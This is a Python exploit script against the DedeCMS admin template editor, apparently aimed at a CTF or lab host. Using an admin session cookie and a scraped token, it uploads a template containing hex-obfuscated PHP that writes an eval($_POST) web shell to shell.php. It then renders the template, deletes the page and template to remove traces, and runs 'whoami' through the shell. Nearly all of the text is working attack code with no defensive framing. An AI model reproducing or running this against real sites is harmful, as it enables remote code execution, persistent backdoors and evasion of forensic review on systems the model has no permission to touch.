import requests
from urllib.parse import urljoin
import re

cookies = {
    "PHPSESSID": "e57cp01793al1ef3r8f4qcb3o3"
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
}

s = requests.session()
s.headers.update(headers)
s.cookies.update(cookies)

def exp(url):
    
    # 创建恶意模板
    tpl_url = urljoin(url, "dede/tpl.php")
    ## 获取token
    params="action=newfile&acdir=default"
    r = s.get(tpl_url, params=params)

    token = re.search('"token" value="([a-z0-9]{32})"', r.text).group(1)
    # print(token)
    shell = """<?php
    "\\x66\\x69\\x6c\\x65\\x5f\\x70\\x75\\x74\\x5f\\x63\\x6f\\x6e\\x74\\x65\\x6e\\x74\\x73"('./shell.php', "<?php eva" . "l(\$_POS" . "T[a]);");
    """
    data = {
        "action": "saveedit",
        "acdir": "default",
        "token": token,
        "filename": "hack.htm",
        "content": shell
    }
    
    r = s.post(tpl_url, data=data)
    if "成功" in r.text:
        print("成功创建模板")
    
    # 利用恶意模板新建页面
    templets_url = urljoin(url, "dede/templets_one_add.php")
    data = {
        "dopost": "save",
        "title": "hack",
        "keywords": "hack",
        "description": "hack",
        "likeidsel": "default",
        "nfilename": "/a/hack.php",
        "template": "{style}/hack.htm",
        "ismake": 0,
        "body": ""
    }
    r = s.post(templets_url, data=data)
    if "成功" in r.text:
        print("成功增加页面")
    s.get(urljoin(url, "a/hack.php"))

    # 清理痕迹
    ## 获取aid
    r = s.get(urljoin(url, "dede/templets_one.php"))
    aid = re.search("'templets_one_edit.php\?aid=([0-9]+)&dopost=edit'>hack", r.text).group(1)
    ## 删除页面
    params = f"aid={aid}&dopost=delete"
    r = s.get(urljoin(url, "dede/templets_one_edit.php"), params=params)
    if "成功" in r.text:
        print("成功删除页面")
    ## 删除恶意模板
    params = "action=del&acdir=default&filename=hack.htm"
    r = s.get(tpl_url, params=params)
    if "成功" in r.text:
        print("成功删除模板")
    
    shell_url = urljoin(url, "a/shell.php")
    print("shell地址: " + shell_url)
    print("shell密钥为a")
    r = s.post(shell_url, data={"a":"system('whoami');"})
    print("whoami命令执行结果: " + r.text)



if __name__ == "__main__":
    url = "http://428ebf1d-116f-451d-8bc7-bed3e280b0dc.node.yuzhian.com.cn:8000/"
    exp(url)